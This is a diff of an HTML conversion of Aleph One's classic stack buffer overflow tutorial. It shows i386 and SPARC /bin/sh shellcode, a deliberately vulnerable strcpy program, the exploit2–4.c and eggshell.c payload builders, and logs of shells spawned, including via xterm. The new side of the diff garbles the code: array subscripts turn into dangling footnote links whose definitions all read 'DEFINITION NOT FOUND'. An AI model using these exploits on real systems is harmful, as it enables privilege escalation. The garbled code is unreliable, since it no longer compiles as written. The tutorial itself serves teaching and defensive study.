 molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
-										 movl   %eax,0xc(%esi)
+                                         movl   %eax,0xc(%esi)
 </p>
-<hr />
+<hr  />
 <p>
 movl   $0xb,%eax                     movb   $0xb,%al
 </p>
-<hr />
+<hr  />
 <p>
 movl   $0x1, %eax                    xorl   %ebx,%ebx
 movl   $0x0, %ebx                    movl   %ebx,%eax
-									 inc    %eax
+                                     inc    %eax
 </p>
-<hr />
+<hr  />
 
 <p>
 Our improved code:
@@ -1494,7 +1423,7 @@ Our improved code:
 <p>
 shellcodeasm2.c
 </p>
-<hr />
+<hr  />
 <p>
 void main() {
 _<sub>asm</sub>__("
@@ -1502,7 +1431,7 @@ _<sub>asm</sub>__("
         popl   %esi                     # 1 byte
         movl   %esi,0x8(%esi)           # 3 bytes
         xorl   %eax,%eax                # 2 bytes
-	movb   %eax,0x7(%esi)		# 3 bytes
+    movb   %eax,0x7(%esi)        # 3 bytes
         movl   %eax,0xc(%esi)           # 3 bytes
         movb   $0xb,%al                 # 2 bytes
         movl   %esi,%ebx                # 2 bytes
@@ -1516,12 +1445,11 @@ _<sub>asm</sub>__("
         call   -0x24                    # 5 bytes
         .string \"/bin/sh\"             # 8 bytes
 </p>
-
 <p>
 ");
 }
 </p>
-<hr />
+<hr  />
 
 <p>
 And our new test program:
@@ -1530,12 +1458,12 @@ And our new test program:
 <p>
 testsc2.c
 </p>
-<hr />
+<hr  />
 <p>
 char shellcode[] =
-	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+    "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 </p>
 
 <p>
@@ -1551,20 +1479,20 @@ ret = (int *)&amp;ret + 2;
 <p>
 }
 </p>
-<hr />
-<hr />
+<hr  />
+<hr  />
 <p>
 [aleph1]$ gcc -o testsc2 testsc2.c
 [aleph1]$ ./testsc2
 $ exit
 [aleph1]$
 </p>
-<hr />
+<hr  />
 
 
 <p>
-	Writing an Exploit
-	<code>~~~~~~~~~~~~~~~~</code>
+    Writing an Exploit
+    <code>~~~~~~~~~~~~~~~~</code>
 (or how to mung the stack)
 <code>~~~~~~~~~~~~~~~~~~~~~~~~</code>
 </p>
@@ -1580,7 +1508,7 @@ demonstrate these points:
 <p>
 overflow1.c
 </p>
-<hr />
+<hr  />
 <p>
 char shellcode[] =
         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
@@ -1589,12 +1517,12 @@ char shellcode[] =
 </p>
 
 <p>
-char large<sub>string</sub>[128];
+char large<sub>string<sup><a id="fnr.8" name="fnr.8" class="footref" href="#fn.8">8</a></sup></sub>;
 </p>
 
 <p>
 void main() {
-  char buffer[96];
+  char buffer<sup><a id="fnr.9" name="fnr.9" class="footref" href="#fn.9">9</a></sup>;
   int i;
   long *long<sub>ptr</sub> = (long *) large<sub>string</sub>;
 </p>
@@ -1606,16 +1534,16 @@ for (i = 0; i &lt; 32; i++)
 
 <p>
 for (i = 0; i &lt; strlen(shellcode); i++)
-  large<sub>string</sub>[i] = shellcode[i];
+  large<sub>string[i]</sub> = shellcode[i];
 </p>
 
 <p>
   strcpy(buffer,large<sub>string</sub>);
 }
 </p>
-<hr />
+<hr  />
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ gcc -o exploit1 exploit1.c
 [aleph1]$ ./exploit1
@@ -1623,10 +1551,10 @@ $ exit
 exit
 [aleph1]$
 </p>
-<hr />
+<hr  />
 
 <p>
-   What we have done above is filled the array large<sub>string</sub>[] with the
+   What we have done above is filled the array large<sub>string[]</sub> with the
 address of buffer[], which is where our code will be.  Then we copy our
 shellcode into the beginning of the large<sub>string</sub> string.  strcpy() will then
 copy large<sub>string</sub> onto buffer without doing any bounds checking, and will
@@ -1649,7 +1577,7 @@ pointer:
 <p>
 sp.c
 </p>
-<hr />
+<hr  />
 <p>
 unsigned long get<sub>sp</sub>(void) {
    _<sub>asm</sub>_<sub>("movl %esp,%eax")</sub>;
@@ -1658,15 +1586,15 @@ void main() {
   printf("0x%x\n", get<sub>sp</sub>());
 }
 </p>
-<hr />
+<hr  />
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ ./sp
 0x8000470
 [aleph1]$
 </p>
-<hr />
+<hr  />
 
 <p>
 Lets assume this is the program we are trying to overflow is:
@@ -1675,18 +1603,18 @@ Lets assume this is the program we are trying to overflow is:
 <p>
 vulnerable.c
 </p>
-<hr />
+<hr  />
 <p>
 void main(int argc, char *argv[]) {
-  char buffer[512];
+  char buffer<sup><a id="fnr.10" name="fnr.10" class="footref" href="#fn.10">10</a></sup>;
 </p>
 
 <p>
   if (argc &gt; 1)
-    strcpy(buffer,argv[1]);
+    strcpy(buffer,argv<sup><a id="fnr.7.100" name="fnr.7.100" class="footref" href="#fn.7">7</a></sup>);
 }
 </p>
-<hr />
+<hr  />
 
 <p>
    We can create a program that takes as a parameter a buffer size, and an
@@ -1698,7 +1626,7 @@ so it is easy to manipulate:
 <p>
 exploit2.c
 </p>
-<hr />
+<hr  />
 <p>
 #include &lt;stdlib.h&gt;
 </p>
@@ -1730,8 +1658,8 @@ void main(int argc, char *argv[]) {
 </p>
 
 <p>
-if (argc &gt; 1) bsize  = atoi(argv[1]);
-if (argc &gt; 2) offset = atoi(argv[2]);
+if (argc &gt; 1) bsize  = atoi(argv<sup><a id="fnr.7.100" name="fnr.7.100" class="footref" href="#fn.7">7</a></sup>);
+if (argc &gt; 2) offset = atoi(argv<sup><a id="fnr.5.100" name="fnr.5.100" class="footref" href="#fn.5">5</a></sup>);
 </p>
 
 <p>
@@ -1769,13 +1697,13 @@ buff[bsize - 1] = '\0';
   system("/bin/bash");
 }
 </p>
-<hr />
+<hr  />
 
 <p>
 Now we can try to guess what the buffer and offset should be:
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ ./exploit2 500
 Using address: 0xbffffdb4
@@ -1804,7 +1732,7 @@ Using address: 0xbffff794
 [aleph1]$ ./vulnerable $EGG
 $
 </p>
-<hr />
+<hr  />
 
 <p>
    As we can see this is not an efficient process.  Trying to guess the
@@ -1833,18 +1761,18 @@ memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
 </p>
 
 <p>
-&lt;-&#x2013;&#x2014;   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
+&lt;&#x2014;&#x2014;   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
                  ^                     |
 </p>
 <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <tbody>
 <tr>
-<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">_</span></span></span></span></span></span></span></span></span></span></td>
+<td class="left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">_</span></span></span></span></span></span></span></span></span></span></td>
 </tr>
 </tbody>
 </table>
@@ -1860,7 +1788,7 @@ The new exploits is then:
 <p>
 exploit3.c
 </p>
-<hr />
+<hr  />
 <p>
 #include &lt;stdlib.h&gt;
 </p>
@@ -1893,8 +1821,8 @@ void main(int argc, char *argv[]) {
 </p>
 
 <p>
-if (argc &gt; 1) bsize  = atoi(argv[1]);
-if (argc &gt; 2) offset = atoi(argv[2]);
+if (argc &gt; 1) bsize  = atoi(argv<sup><a id="fnr.7.100" name="fnr.7.100" class="footref" href="#fn.7">7</a></sup>);
+if (argc &gt; 2) offset = atoi(argv<sup><a id="fnr.5.100" name="fnr.5.100" class="footref" href="#fn.5">5</a></sup>);
 </p>
 
 <p>
@@ -1937,7 +1865,7 @@ buff[bsize - 1] = '\0';
   system("/bin/bash");
 }
 </p>
-<hr />
+<hr  />
 
 <p>
    A good selection for our buffer size is about 100 bytes more than the size
@@ -1948,14 +1876,14 @@ buffer we are trying to overflow is 512 bytes long, so we'll use 612.  Let's
 try to overflow our test program with our new exploit:
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ ./exploit3 612
 Using address: 0xbffffdb4
 [aleph1]$ ./vulnerable $EGG
 $
 </p>
-<hr />
+<hr  />
 
 <p>
    Whoa!  First try!  This change has improved our chances a hundredfold. 
@@ -1966,7 +1894,7 @@ be running an X server and allow connections to it from the localhost.  Set
 your DISPLAY variable accordingly.
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ export DISPLAY=:0.0
 [aleph1]$ ./exploit3 1124
@@ -1993,7 +1921,7 @@ Using address: 0xbffffb54
 Warning: some arguments in previous message were lost
 bash\)
 </p>
-<hr />
+<hr  />
 
 <p>
    Eureka! Less than a dozen tries and we found the magic numbers. If xterm
@@ -2042,7 +1970,7 @@ containing the shellcode and NOPs. Our new exploit now looks like this:
 <p>
 exploit4.c
 </p>
-<hr />
+<hr  />
 <p>
 #include &lt;stdlib.h&gt;
 </p>
@@ -2076,9 +2004,9 @@ void main(int argc, char *argv[]) {
 </p>
 
 <p>
-if (argc &gt; 1) bsize   = atoi(argv[1]);
-if (argc &gt; 2) offset  = atoi(argv[2]);
-if (argc &gt; 3) eggsize = atoi(argv[3]);
+if (argc &gt; 1) bsize   = atoi(argv<sup><a id="fnr.7.100" name="fnr.7.100" class="footref" href="#fn.7">7</a></sup>);
+if (argc &gt; 2) offset  = atoi(argv<sup><a id="fnr.5.100" name="fnr.5.100" class="footref" href="#fn.5">5</a></sup>);
+if (argc &gt; 3) eggsize = atoi(argv<sup><a id="fnr.11" name="fnr.11" class="footref" href="#fn.11">11</a></sup>);
 </p>
 
 
@@ -2129,26 +2057,26 @@ egg[eggsize - 1] = '\0';
   system("/bin/bash");
 }
 </p>
-<hr />
+<hr  />
 
 <p>
 Lets try our new exploit with our vulnerable test program:
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ ./exploit4 768
 Using address: 0xbffffdb0
 [aleph1]$ ./vulnerable $RET
 $
 </p>
-<hr />
+<hr  />
 
 <p>
 Works like a charm. Now lets try it on xterm:
 </p>
 
-<hr />
+<hr  />
 <p>
 [aleph1]$ export DISPLAY=:0.0
 [aleph1]$ ./exploit4 2148
@@ -2165,7 +2093,7 @@ Warning: Color name
 Warning: some arguments in previous message were lost
 $
 </p>
-<hr />
+<hr  />
 
 <p>
    On the first try!  It has certainly increased our odds.  Depending how 
@@ -2225,32 +2153,32 @@ Appendix A - Shellcode for Different Operating Systems/Architectures
 <p>
 i386/Linux
 </p>
-<hr />
+<hr  />
 <p>
-	jmp    0x1f
-	popl   %esi
-	movl   %esi,0x8(%esi)
-	xorl   %eax,%eax
+    jmp    0x1f
+    popl   %esi
+    movl   %esi,0x8(%esi)
+    xorl   %eax,%eax
 movb   %eax,0x7(%esi)
-	movl   %eax,0xc(%esi)
-	movb   $0xb,%al
-	movl   %esi,%ebx
-	leal   0x8(%esi),%ecx
-	leal   0xc(%esi),%edx
-	int    $0x80
-	xorl   %ebx,%ebx
-	movl   %ebx,%eax
-	inc    %eax
-	int    $0x80
-	call   -0x24
-	.string \"/bin/sh\"
+    movl   %eax,0xc(%esi)
+    movb   $0xb,%al
+    movl   %esi,%ebx
+    leal   0x8(%esi),%ecx
+    leal   0xc(%esi),%edx
+    int    $0x80
+    xorl   %ebx,%ebx
+    movl   %ebx,%eax
+    inc    %eax
+    int    $0x80
+    call   -0x24
+    .string \"/bin/sh\"
 </p>
-<hr />
+<hr  />
 
 <p>
 SPARC/Solaris
 </p>
-<hr />
+<hr  />
 <p>
 sethi   0xbd89a, %l6
 or      %l6, 0x16e, %l6
@@ -2268,31 +2196,31 @@ xor     %o7, %o7, %o0
 mov     1, %g1
 ta      8
 </p>
-<hr />
+<hr  />
 
 <p>
 SPARC/SunOS
 </p>
-<hr />
+<hr  />
 <p>
-	sethi   0xbd89a, %l6
-	or      %l6, 0x16e, %l6
-	sethi   0xbdcda, %l7
-	and     %sp, %sp, %o0
-	add     %sp, 8, %o1
-	xor     %o2, %o2, %o2
-	add     %sp, 16, %sp
-	std     %l6, [%sp - 16]
-	st      %sp, [%sp - 8]
-	st      %g0, [%sp - 4]
-	mov     0x3b, %g1
-mov	-0x1, %l5
-	ta      %l5 + 1
-	xor     %o7, %o7, %o0
-	mov     1, %g1
-	ta      %l5 + 1
+    sethi   0xbd89a, %l6
+    or      %l6, 0x16e, %l6
+    sethi   0xbdcda, %l7
+    and     %sp, %sp, %o0
+    add     %sp, 8, %o1
+    xor     %o2, %o2, %o2
+    add     %sp, 16, %sp
+    std     %l6, [%sp - 16]
+    st      %sp, [%sp - 8]
+    st      %g0, [%sp - 4]
+    mov     0x3b, %g1
+mov    -0x1, %l5
+    ta      %l5 + 1
+    xor     %o7, %o7, %o0
+    mov     1, %g1
+    ta      %l5 + 1
 </p>
-<hr />
+<hr  />
 
 
 <p>
@@ -2303,7 +2231,7 @@ Appendix B - Generic Buffer Overflow Program
 <p>
 shellcode.h
 </p>
-<hr />
+<hr  />
 <p>
 #if defined(<span class="underline"><span class="underline">i386</span></span>) &amp;&amp; defined(<span class="underline"><span class="underline">linux</span></span>)
 </p>
@@ -2366,20 +2294,21 @@ unsigned long get<sub>sp</sub>(void) {
 <p>
 #endif
 </p>
-<hr />
+<hr  />
 
 <p>
 eggshell.c
 </p>
-<hr />
+<hr  />
 <p>
 /*
 </p>
 <ul class="org-ul">
-<li>eggshell v1.0</li>
+<li>eggshell v1.0
+</li>
 <li></li>
-
-<li>Aleph One / aleph1@underground.org</li>
+<li>Aleph One / aleph1@underground.org
+</li>
 </ul>
 <p>
  */
@@ -2409,21 +2338,21 @@ void main(int argc, char *argv[]) {
 <p>
 while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
   switch (c) {
-	case 'a':
-	  align = atoi(optarg);
-	  break;
-	case 'b':
-	  bsize = atoi(optarg);
-	  break;
-	case 'e':
-	  eggsize = atoi(optarg);
-	  break;
-	case 'o':
-	  offset = atoi(optarg);
-	  break;
-	case '?':
-	  usage();
-	  exit(0);
+    case 'a':
+      align = atoi(optarg);
+      break;
+    case 'b':
+      bsize = atoi(optarg);
+      break;
+    case 'e':
+      eggsize = atoi(optarg);
+      break;
+    case 'o':
+      offset = atoi(optarg);
+      break;
+    case '?':
+      usage();
+      exit(0);
   }
 </p>
 
@@ -2462,8 +2391,8 @@ for (i = 0; i &lt; bsize; i+=4)
 ptr = egg;
 for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP<sub>SIZE</sub>; i <del>= NOP<sub>SIZE</sub>)
   for (n = 0; n &lt; NOP<sub>SIZE</sub>; n+</del>) {
-	m = (n + align) % NOP<sub>SIZE</sub>;
-	*(ptr++) = nop[m];
+    m = (n + align) % NOP<sub>SIZE</sub>;
+    *(ptr++) = nop[m];
   }
 </p>
 
@@ -2495,6 +2424,34 @@ void usage(void) {
     "usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offset&gt;]\n");
 }
 </p>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" name="fn.1" class="footnum" href="#fnr.1">1</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.2" name="fn.2" class="footnum" href="#fnr.2">2</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.3" name="fn.3" class="footnum" href="#fnr.3">3</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.4" name="fn.4" class="footnum" href="#fnr.4">4</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.5" name="fn.5" class="footnum" href="#fnr.5">5</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.6" name="fn.6" class="footnum" href="#fnr.6">6</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.7" name="fn.7" class="footnum" href="#fnr.7">7</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.8" name="fn.8" class="footnum" href="#fnr.8">8</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.9" name="fn.9" class="footnum" href="#fnr.9">9</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.10" name="fn.10" class="footnum" href="#fnr.10">10</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+<div class="footdef"><sup><a id="fn.11" name="fn.11" class="footnum" href="#fnr.11">11</a></sup> <p>DEFINITION NOT FOUND.</p></div>
+
+
 </div>
+</div></div>
 </body>
 </html>
